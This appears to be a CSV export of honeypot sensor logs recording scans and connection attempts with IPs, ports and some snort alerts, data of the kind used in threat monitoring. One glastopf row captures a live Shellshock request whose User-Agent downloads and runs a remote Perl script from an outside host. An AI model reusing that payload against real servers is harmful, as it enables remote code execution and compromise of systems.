id,ident,normalized,timestamp,channel,pattern,filename,request_raw,request_url,attackerIP,attackerPort,victimPort,victimIP,connectionType,connectionProtocol,priority,header,signature,sensor,connectionTransport,remoteHostname
551e35159f8c6d649a28c782,5bf781dc-4726-11e4-9ee4-0a0b6e7c3e9e,True,2015-04-03T06:37:09.095+0000,amun.events,,,,,212.15.48.34,17115.0,445.0,172.31.14.66,initial,,,,,,,
551602229f8c6d649a28838f,5bf781dc-4726-11e4-9ee4-0a0b6e7c3e9e,True,2015-03-28T01:21:38.532+0000,amun.events,,,,,189.186.86.175,58136.0,445.0,172.31.14.66,initial,,,,,,,
55a4f5629f8c6d649a2dbf22,eb030eb8-3c69-11e4-9ee4-0a0b6e7c3e9e,True,2015-07-14T11:41:22.384+0000,amun.events,,,,,192.187.110.98,44534.0,3128.0,172.31.13.124,initial,,,,,,,
57acc8b69f8c6d649a348133,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-08-11T18:49:26.179+0000,dionaea.connections,,,,,176.33.142.7,11413.0,23.0,162.244.30.100,reject,pcap,,,,,tcp,
5881f8b99f8c6d649a3d944e,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2017-01-20T11:47:05.832+0000,dionaea.connections,,,,,162.254.205.73,40355.0,30353.0,162.244.30.100,reject,pcap,,,,,tcp,
58582dcc9f8c6d649a39d470,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-12-19T18:58:20.184+0000,dionaea.connections,,,,,::ffff:185.40.4.65,5070.0,5060.0,::,connect,SipSession,,,,,udp,
587a06069f8c6d649a3cb107,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2017-01-14T11:05:42.435+0000,dionaea.connections,,,,,159.203.229.49,39344.0,990.0,162.244.30.100,reject,pcap,,,,,tcp,
54cc999d9f8c6d649a267c20,eb030eb8-3c69-11e4-9ee4-0a0b6e7c3e9e,True,2015-01-31T09:00:13.638+0000,amun.events,,,,,54.144.23.48,56046.0,80.0,172.31.13.124,initial,,,,,,,
57b8c9da9f8c6d649a34c479,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-08-20T21:21:30.767+0000,dionaea.connections,,,,,71.6.135.131,13944.0,1010.0,162.244.30.100,reject,pcap,,,,,tcp,
5633453e9f8c6d649a2fc5ee,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2015-10-30T10:23:58.117+0000,dionaea.connections,,,,,::ffff:195.154.215.117,5072.0,54943.0,::ffff:162.244.30.100,connect,RtpUdpStream,,,,,udp,::ffff:195.154.215.117
58813c759f8c6d649a3d0fac,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2017-01-19T22:23:49.706+0000,dionaea.connections,,,,,162.254.205.73,40355.0,16956.0,162.244.30.100,reject,pcap,,,,,tcp,
57a1c06b9f8c6d649a343389,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-08-03T09:59:07.889+0000,dionaea.connections,,,,,207.244.70.169,42414.0,3443.0,162.244.30.100,reject,pcap,,,,,tcp,
5856ab1b9f8c6d649a397fdd,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-12-18T15:28:27.332+0000,dionaea.connections,,,,,1.55.163.241,63309.0,23.0,162.244.30.100,reject,pcap,,,,,tcp,
54591c839f8c6d41306db571,eb030eb8-3c69-11e4-9ee4-0a0b6e7c3e9e,True,2014-11-04T18:35:47.308+0000,amun.events,,,,,43.244.248.189,54790.0,23.0,172.31.13.124,initial,,,,,,,
5659e66c9f8c6d649a30aada,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2015-11-28T17:37:48.591+0000,dionaea.connections,,,,,195.154.217.211,64580.0,5304.0,162.244.30.100,reject,pcap,,,,,tcp,
57d532739f8c6d649a3568d0,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-09-11T10:31:15.409+0000,dionaea.connections,,,,,189.27.64.223,53442.0,23.0,162.244.30.100,reject,pcap,,,,,tcp,
5435225c9f8c6d41306b4ea1,eb030eb8-3c69-11e4-9ee4-0a0b6e7c3e9e,True,2014-10-08T11:39:08.142+0000,amun.events,,,,,61.153.106.24,24719.0,135.0,172.31.13.124,initial,,,,,,,
585841709f8c6d649a39e922,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-12-19T20:22:08.050+0000,dionaea.connections,,,,,::ffff:185.40.4.65,5070.0,5060.0,::,connect,SipCall,,,,,udp,
584d753a9f8c6d649a37b263,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-12-11T15:48:10.064+0000,dionaea.connections,,,,,163.172.67.30,51689.0,31018.0,162.244.30.100,reject,pcap,,,,,tcp,
55697e049f8c6d649a2b724b,eb030eb8-3c69-11e4-9ee4-0a0b6e7c3e9e,True,2015-05-30T09:08:20.458+0000,amun.events,,,,,46.51.219.201,52690.0,25.0,172.31.13.124,initial,,,,,,,
542f48589f8c6d41306af947,eb030eb8-3c69-11e4-9ee4-0a0b6e7c3e9e,True,2014-10-04T01:07:36.974+0000,amun.events,,,,,54.169.105.43,47297.0,443.0,172.31.13.124,initial,,,,,,,
54d2755b9f8c6d649a26ae3e,eb030eb8-3c69-11e4-9ee4-0a0b6e7c3e9e,True,2015-02-04T19:39:07.104+0000,amun.events,,,,,50.243.3.241,54521.0,25.0,172.31.13.124,initial,,,,,,,
584fce499f8c6d649a38fa8f,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-12-13T10:32:41.626+0000,dionaea.connections,,,,,42.118.117.127,23477.0,23.0,162.244.30.100,reject,pcap,,,,,tcp,
577929e39f8c6d649a335ca0,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-07-03T15:06:11.796+0000,dionaea.connections,,,,,80.87.205.246,53795.0,564.0,162.244.30.100,reject,pcap,,,,,tcp,
587161c79f8c6d649a3c164f,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2017-01-07T21:46:47.257+0000,dionaea.connections,,,,,60.205.171.182,55413.0,7547.0,162.244.30.100,reject,pcap,,,,,tcp,
5859905f9f8c6d649a3aa16c,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-12-20T20:11:11.532+0000,dionaea.connections,,,,,91.225.228.157,50049.0,23231.0,162.244.30.100,reject,pcap,,,,,tcp,
55bd36619f8c6d649a2e48dc,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2015-08-01T21:13:05.325+0000,dionaea.connections,,,,,::ffff:109.200.30.233,5071.0,5060.0,::,connect,SipSession,,,,,udp,
5759457f9f8c6d649a32886a,3cc23d7a-c1ba-11e4-9ee4-0a0b6e7c3e9e,True,2016-06-09T10:31:27.183+0000,snort.alerts,,,,,0.0.0.0,,,255.255.255.255,Potentially Bad Traffic,UDP,2,1:527:8,BAD-TRAFFIC same SRC/DST,3cc23d7a-c1ba-11e4-9ee4-0a0b6e7c3e9e,,
5633f6f29f8c6d649a2fc6e5,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2015-10-30T23:02:10.360+0000,dionaea.connections,,,,,::ffff:93.174.93.181,39788.0,445.0,::ffff:162.244.30.100,accept,smbd,,,,,tcp,
552dfbba9f8c6d649a29088f,eb030eb8-3c69-11e4-9ee4-0a0b6e7c3e9e,True,2015-04-15T05:48:42.089+0000,amun.events,,,,,23.107.16.6,3229.0,3389.0,172.31.13.124,initial,,,,,,,
584cefff9f8c6d649a36a001,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-12-11T06:19:43.720+0000,dionaea.connections,,,,,183.8.247.240,33887.0,23.0,162.244.30.100,reject,pcap,,,,,tcp,
54b1d8b19f8c6d3afa8380a6,eb030eb8-3c69-11e4-9ee4-0a0b6e7c3e9e,True,2015-01-11T01:58:09.104+0000,amun.events,,,,,178.32.7.43,36416.0,80.0,172.31.13.124,initial,,,,,,,
555c4ec99f8c6d649a2ad405,5bf781dc-4726-11e4-9ee4-0a0b6e7c3e9e,True,2015-05-20T09:07:21.856+0000,amun.events,,,,,220.191.231.222,58839.0,3389.0,172.31.14.66,initial,,,,,,,
5858d8739f8c6d649a3a8f4d,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-12-20T07:06:27.630+0000,dionaea.connections,,,,,::ffff:185.40.4.65,5071.0,5060.0,::,connect,SipCall,,,,,udp,
5612a3bd9f8c6d649a2f2790,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2015-10-05T16:22:21.087+0000,dionaea.connections,,,,,61.160.213.38,39557.0,3128.0,162.244.30.100,reject,pcap,,,,,tcp,
57c097629f8c6d649a34fee6,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-08-26T19:24:18.461+0000,dionaea.connections,,,,,61.240.144.65,59806.0,443.0,162.244.30.100,reject,pcap,,,,,tcp,
55dc5ad39f8c6d649a2e8826,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2015-08-25T12:08:51.374+0000,dionaea.connections,,,,,::ffff:142.54.183.26,5076.0,5060.0,::,connect,SipSession,,,,,udp,
5658176a9f8c6d649a306beb,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2015-11-27T08:42:18.464+0000,dionaea.connections,,,,,::ffff:88.150.252.176,5064.0,5060.0,::,connect,SipSession,,,,,udp,
5484be869f8c6d41306ebb25,5bf781dc-4726-11e4-9ee4-0a0b6e7c3e9e,True,2014-12-07T20:54:30.417+0000,amun.events,,,,,204.188.195.74,1786.0,110.0,172.31.14.66,initial,,,,,,,
5577edfa9f8c6d649a2c0d6d,5bf781dc-4726-11e4-9ee4-0a0b6e7c3e9e,True,2015-06-10T07:57:46.143+0000,amun.events,,,,,58.229.188.2,2089.0,3389.0,172.31.14.66,initial,,,,,,,
586c6b0e9f8c6d649a3bcc88,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2017-01-04T03:25:02.254+0000,dionaea.connections,,,,,37.57.234.71,43089.0,5358.0,162.244.30.100,reject,pcap,,,,,tcp,
543575c59f8c6d41306bbd83,eb030eb8-3c69-11e4-9ee4-0a0b6e7c3e9e,True,2014-10-08T17:35:01.656+0000,amun.events,,,,,61.153.106.24,20309.0,135.0,172.31.13.124,initial,,,,,,,
584d7d439f8c6d649a381faf,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-12-11T16:22:27.424+0000,dionaea.connections,,,,,163.172.67.30,53759.0,43705.0,162.244.30.100,reject,pcap,,,,,tcp,
585b48d19f8c6d649a3ac340,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-12-22T03:30:25.474+0000,dionaea.connections,,,,,42.112.65.87,15193.0,23.0,162.244.30.100,reject,pcap,,,,,tcp,
5545ba1b9f8c6d649a29b894,eb030eb8-3c69-11e4-9ee4-0a0b6e7c3e9e,True,2015-05-03T06:03:07.958+0000,amun.events,,,,,104.149.197.103,2657.0,3389.0,172.31.13.124,initial,,,,,,,
554ff7669f8c6d649a2a0372,5bf781dc-4726-11e4-9ee4-0a0b6e7c3e9e,True,2015-05-11T00:27:18.258+0000,amun.events,,,,,218.90.212.90,64341.0,3389.0,172.31.14.66,initial,,,,,,,
563741ae9f8c6d649a2fcf0e,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2015-11-02T10:57:50.444+0000,dionaea.connections,,,,,222.186.56.39,6000.0,7022.0,162.244.30.100,reject,pcap,,,,,tcp,
57dc6e089f8c6d649a35a255,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-09-16T22:11:20.421+0000,dionaea.connections,,,,,189.41.32.81,24171.0,23.0,162.244.30.100,reject,pcap,,,,,tcp,
58584cfe9f8c6d649a39f583,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-12-19T21:11:26.309+0000,dionaea.connections,,,,,::ffff:185.40.4.65,5076.0,5060.0,::,connect,SipSession,,,,,udp,
574a0f6e9f8c6d649a321fbe,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-05-28T21:36:46.899+0000,dionaea.connections,,,,,61.35.200.132,52216.0,23.0,162.244.30.100,reject,pcap,,,,,tcp,
588394c59f8c6d649a3ea6d3,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2017-01-21T17:05:09.452+0000,dionaea.connections,,,,,162.254.205.73,40028.0,7951.0,162.244.30.100,reject,pcap,,,,,tcp,
5881a5119f8c6d649a3d5bc3,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2017-01-20T05:50:09.056+0000,dionaea.connections,,,,,162.254.205.73,40355.0,26697.0,162.244.30.100,reject,pcap,,,,,tcp,
55be4a0c9f8c6d649a2e4a45,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2015-08-02T16:49:16.964+0000,dionaea.connections,,,,,95.8.63.177,38605.0,23.0,162.244.30.100,reject,pcap,,,,,tcp,
5564a56e9f8c6d649a2b1e28,eb030eb8-3c69-11e4-9ee4-0a0b6e7c3e9e,True,2015-05-26T16:55:10.988+0000,amun.events,,,,,209.195.89.219,60582.0,23.0,172.31.13.124,initial,,,,,,,
5858070d9f8c6d649a39abfc,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-12-19T16:13:01.411+0000,dionaea.connections,,,,,::ffff:185.40.4.65,5071.0,5060.0,::,connect,SipCall,,,,,udp,
54d275cd9f8c6d649a26aea7,eb030eb8-3c69-11e4-9ee4-0a0b6e7c3e9e,True,2015-02-04T19:41:01.330+0000,amun.events,,,,,50.243.3.241,49252.0,25.0,172.31.13.124,initial,,,,,,,
585862669f8c6d649a3a0bc8,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-12-19T22:42:46.935+0000,dionaea.connections,,,,,188.213.45.241,23534.0,23.0,162.244.30.100,reject,pcap,,,,,tcp,
57b11f4a9f8c6d649a349a6a,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-08-15T01:47:54.071+0000,dionaea.connections,,,,,171.248.240.159,1883.0,23.0,162.244.30.100,reject,pcap,,,,,tcp,
5435c2579f8c6d41306c22a4,eb030eb8-3c69-11e4-9ee4-0a0b6e7c3e9e,True,2014-10-08T23:01:43.588+0000,amun.events,,,,,61.153.106.24,18120.0,135.0,172.31.13.124,initial,,,,,,,
5447da4e9f8c6d41306d341f,eb030eb8-3c69-11e4-9ee4-0a0b6e7c3e9e,True,2014-10-22T16:24:46.636+0000,amun.events,,,,,104.200.19.100,33921.0,25.0,172.31.13.124,initial,,,,,,,
54ac7f0e9f8c6d3afa836e1c,eb030eb8-3c69-11e4-9ee4-0a0b6e7c3e9e,True,2015-01-07T00:34:22.658+0000,amun.events,,,,,82.53.6.83,53986.0,23.0,172.31.13.124,initial,,,,,,,
55e149869f8c6d649a2e948f,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2015-08-29T05:56:22.694+0000,dionaea.connections,,,,,49.64.197.50,60933.0,1993.0,162.244.30.100,reject,pcap,,,,,tcp,
584d757b9f8c6d649a37b55a,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-12-11T15:49:15.762+0000,dionaea.connections,,,,,163.172.67.30,51756.0,31448.0,162.244.30.100,reject,pcap,,,,,tcp,
5769cc059f8c6d649a32f33d,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-06-21T23:21:41.566+0000,dionaea.connections,,,,,113.163.76.243,47757.0,23.0,162.244.30.100,reject,pcap,,,,,tcp,
57e2faae9f8c6d649a35da81,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-09-21T21:25:02.096+0000,dionaea.connections,,,,,139.162.34.142,57117.0,8088.0,162.244.30.100,reject,pcap,,,,,tcp,
56a851d19f8c6d649a31fedc,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-01-27T05:12:49.045+0000,dionaea.connections,,,,,141.212.122.81,40581.0,23.0,162.244.30.100,reject,pcap,,,,,tcp,
586885439f8c6d649a3b9abb,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2017-01-01T04:27:47.936+0000,dionaea.connections,,,,,187.160.73.217,24891.0,23.0,162.244.30.100,reject,pcap,,,,,tcp,
5446ffb09f8c6d41306d31cf,eb030eb8-3c69-11e4-9ee4-0a0b6e7c3e9e,True,2014-10-22T00:52:00.889+0000,amun.events,,,,,85.105.85.72,1817.0,110.0,172.31.13.124,initial,,,,,,,
55535bbd9f8c6d649a2a1eff,eb030eb8-3c69-11e4-9ee4-0a0b6e7c3e9e,True,2015-05-13T14:12:13.738+0000,amun.events,,,,,70.183.1.241,43719.0,23.0,172.31.13.124,initial,,,,,,,
5602a5149f8c6d649a2ef281,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2015-09-23T13:11:48.200+0000,dionaea.connections,,,,,58.218.211.157,38677.0,3128.0,162.244.30.100,reject,pcap,,,,,tcp,
5883924d9f8c6d649a3ea5f4,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2017-01-21T16:54:37.639+0000,dionaea.connections,,,,,162.254.205.73,40028.0,51833.0,162.244.30.100,reject,pcap,,,,,tcp,
58420a8d9f8c6d649a3612ce,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-12-02T23:58:05.459+0000,dionaea.connections,,,,,93.118.106.104,7316.0,23.0,162.244.30.100,reject,pcap,,,,,tcp,
584d7a4f9f8c6d649a37f1c0,3cc23d7a-c1ba-11e4-9ee4-0a0b6e7c3e9e,True,2016-12-11T16:09:51.855+0000,snort.alerts,,,,,163.172.67.30,,,162.244.30.100,Misc activity,ICMP,3,1:486:4,ICMP Destination Unreachable Communication with Destination Host is Administratively Prohibited,3cc23d7a-c1ba-11e4-9ee4-0a0b6e7c3e9e,,
584b72e09f8c6d649a368c17,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-12-10T03:13:36.671+0000,dionaea.connections,,,,,59.126.24.184,47145.0,23.0,162.244.30.100,reject,pcap,,,,,tcp,
584a1cf49f8c6d649a367bed,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-12-09T02:54:44.820+0000,dionaea.connections,,,,,171.233.185.146,41903.0,23.0,162.244.30.100,reject,pcap,,,,,tcp,
56a4f0f89f8c6d649a31f23c,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-01-24T15:42:48.083+0000,dionaea.connections,,,,,71.6.165.200,38445.0,1025.0,162.244.30.100,reject,pcap,,,,,tcp,
585ef0d39f8c6d649a3afa5d,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-12-24T22:04:03.781+0000,dionaea.connections,,,,,122.117.42.18,55861.0,23.0,162.244.30.100,reject,pcap,,,,,tcp,
54d460189f8c6d649a26ba79,eb030eb8-3c69-11e4-9ee4-0a0b6e7c3e9e,True,2015-02-06T06:32:56.656+0000,amun.events,,,,,64.53.84.66,61189.0,8080.0,172.31.13.124,initial,,,,,,,
550b17079f8c6d649a2806e4,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2015-03-19T18:35:51.159+0000,dionaea.connections,,,,,94.20.82.114,38074.0,4899.0,162.244.30.100,reject,pcap,,,,,tcp,
585d6ffc9f8c6d649a3ae32c,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-12-23T18:42:04.461+0000,dionaea.connections,,,,,116.110.209.66,41387.0,23.0,162.244.30.100,reject,pcap,,,,,tcp,
5435f4dc9f8c6d41306c678a,eb030eb8-3c69-11e4-9ee4-0a0b6e7c3e9e,True,2014-10-09T02:37:16.719+0000,amun.events,,,,,61.153.106.24,34387.0,135.0,172.31.13.124,initial,,,,,,,
5868cb1f9f8c6d649a3b9c6a,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2017-01-01T09:25:51.287+0000,dionaea.connections,,,,,74.83.60.128,6404.0,23231.0,162.244.30.100,reject,pcap,,,,,tcp,
544a12e89f8c6d41306d4df0,5bf781dc-4726-11e4-9ee4-0a0b6e7c3e9e,True,2014-10-24T08:50:48.255+0000,amun.events,,,,,71.190.176.162,3420.0,110.0,172.31.14.66,initial,,,,,,,
584d834d9f8c6d649a386fd6,3cc23d7a-c1ba-11e4-9ee4-0a0b6e7c3e9e,True,2016-12-11T16:48:13.630+0000,snort.alerts,,,,,163.172.67.30,,,162.244.30.100,Misc activity,ICMP,3,1:486:4,ICMP Destination Unreachable Communication with Destination Host is Administratively Prohibited,3cc23d7a-c1ba-11e4-9ee4-0a0b6e7c3e9e,,
584d6ffb9f8c6d649a376d73,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-12-11T15:25:47.568+0000,dionaea.connections,,,,,163.172.67.30,50361.0,22825.0,162.244.30.100,reject,pcap,,,,,tcp,
55655cb79f8c6d649a2b2555,eb030eb8-3c69-11e4-9ee4-0a0b6e7c3e9e,True,2015-05-27T05:57:11.370+0000,amun.events,,,,,98.247.32.193,40333.0,23.0,172.31.13.124,initial,,,,,,,
557734e49f8c6d649a2c05c9,5bf781dc-4726-11e4-9ee4-0a0b6e7c3e9e,True,2015-06-09T18:48:04.434+0000,amun.events,,,,,99.50.85.8,41902.0,23.0,172.31.14.66,initial,,,,,,,
543e693a9f8c6d41306ccc2b,eb030eb8-3c69-11e4-9ee4-0a0b6e7c3e9e,True,2014-10-15T12:31:54.079+0000,amun.events,,,,,37.203.214.248,1330.0,110.0,172.31.13.124,initial,,,,,,,
56087bd89f8c6d649a2f0324,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2015-09-27T23:29:28.066+0000,dionaea.connections,,,,,198.204.238.122,51164.0,8099.0,162.244.30.100,reject,pcap,,,,,tcp,
54fd7a839f8c6d649a27a7a0,a16f5f36-3c41-11e4-9ee4-0a0b6e7c3e9e,True,2015-03-09T10:48:35.159+0000,glastopf.events,unknown,,"GET /cgi-bin/contact.cgi HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: en-us
Connection: Close
Host: 54.68.96.53
User-Agent: () { :;};/usr/bin/perl -e 'print ""Content-Type: text/plain\r\n\r\nXSUCCESS!"";system(""killall -9 perl;wget http://test.music-set.net/mobile/t3.log -O /tmp/t3.log;curl -O /tmp/t3.log http://test.music-set.net/mobile/t3.log;perl /tmp/t3.log;fetch http://test.music-set.net/mobile/t3.log -O /tmp/t3.log;perl /tmp/t3.log;rm -rf /tmp/t3.log*"");'",/cgi-bin/contact.cgi,62.75.222.235,40875.0,80.0,0,,,,,,,,
58584fad9f8c6d649a39f846,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-12-19T21:22:53.094+0000,dionaea.connections,,,,,::ffff:185.40.4.65,5070.0,5060.0,::,connect,SipCall,,,,,udp,
543588b49f8c6d41306bd622,eb030eb8-3c69-11e4-9ee4-0a0b6e7c3e9e,True,2014-10-08T18:55:48.573+0000,amun.events,,,,,61.153.106.24,22548.0,135.0,172.31.13.124,initial,,,,,,,
584d643d9f8c6d649a36f4c6,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-12-11T14:35:41.331+0000,dionaea.connections,,,,,163.172.67.30,47356.0,9020.0,162.244.30.100,reject,pcap,,,,,tcp,
54d45f329f8c6d649a26b9dc,eb030eb8-3c69-11e4-9ee4-0a0b6e7c3e9e,True,2015-02-06T06:29:06.839+0000,amun.events,,,,,64.53.84.66,46580.0,8080.0,172.31.13.124,initial,,,,,,,
57cb8e1a9f8c6d649a353c21,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-09-04T02:59:38.459+0000,dionaea.connections,,,,,::ffff:103.212.222.21,7483.0,1433.0,::ffff:162.244.30.100,accept,mssqld,,,,,tcp,
5778f4d49f8c6d649a3356ae,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-07-03T11:19:48.278+0000,dionaea.connections,,,,,122.5.105.138,4045.0,23.0,162.244.30.100,reject,pcap,,,,,tcp,
585c00599f8c6d649a3accdc,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-12-22T16:33:29.340+0000,dionaea.connections,,,,,::ffff:192.99.39.107,5285.0,5060.0,::,connect,SipSession,,,,,udp,
55432af19f8c6d649a29ad03,eb030eb8-3c69-11e4-9ee4-0a0b6e7c3e9e,True,2015-05-01T07:27:45.883+0000,amun.events,,,,,198.101.193.22,47863.0,25.0,172.31.13.124,initial,,,,,,,
5882b7bf9f8c6d649a3e0994,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2017-01-21T01:22:07.208+0000,dionaea.connections,,,,,162.254.205.73,40028.0,36218.0,162.244.30.100,reject,pcap,,,,,tcp,
5628c3bd9f8c6d649a2f875b,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2015-10-22T11:08:45.020+0000,dionaea.connections,,,,,::ffff:5.152.222.194,5071.0,5060.0,::,connect,SipCall,,,,,udp,
58b1ede09f8c6d649a3f1269,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2017-02-25T20:49:36.996+0000,dionaea.connections,,,,,190.233.210.219,56420.0,23.0,162.244.30.100,reject,pcap,,,,,tcp,
551a162d9f8c6d649a289fab,5bf781dc-4726-11e4-9ee4-0a0b6e7c3e9e,True,2015-03-31T03:36:13.162+0000,amun.events,,,,,211.220.215.238,49532.0,23.0,172.31.14.66,initial,,,,,,,
584d756c9f8c6d649a37b427,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-12-11T15:49:00.284+0000,dionaea.connections,,,,,163.172.67.30,51756.0,31460.0,162.244.30.100,reject,pcap,,,,,tcp,
555ec39d9f8c6d649a2ae96f,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2015-05-22T05:50:21.355+0000,dionaea.connections,,,,,2.110.39.188,52125.0,5544.0,162.244.30.100,reject,pcap,,,,,tcp,
584d88319f8c6d649a38b5dd,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-12-11T17:09:05.051+0000,dionaea.connections,,,,,163.172.67.30,56561.0,61074.0,162.244.30.100,reject,pcap,,,,,tcp,
585166a39f8c6d649a3913df,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-12-14T15:34:59.723+0000,dionaea.connections,,,,,122.116.241.177,52768.0,23.0,162.244.30.100,reject,pcap,,,,,tcp,
5647a24f9f8c6d649a2fff81,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2015-11-14T21:06:23.761+0000,dionaea.connections,,,,,5.152.216.226,55315.0,19523.0,162.244.30.100,reject,pcap,,,,,tcp,
5436214e9f8c6d41306c9c1a,eb030eb8-3c69-11e4-9ee4-0a0b6e7c3e9e,True,2014-10-09T05:46:54.943+0000,amun.events,,,,,61.153.106.24,16355.0,135.0,172.31.13.124,initial,,,,,,,
5874ae739f8c6d649a3c6b15,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2017-01-10T09:50:43.748+0000,dionaea.connections,,,,,222.186.21.161,55774.0,23.0,162.244.30.100,reject,pcap,,,,,tcp,
56a5f6b89f8c6d649a31f799,a13907c8-c1c1-11e4-9ee4-0a0b6e7c3e9e,True,2016-01-25T10:19:36.490+0000,dionaea.connections,,,,,163.172.13.173,50574.0,8080.0,162.244.30.100,reject,pcap,,,,,tcp,
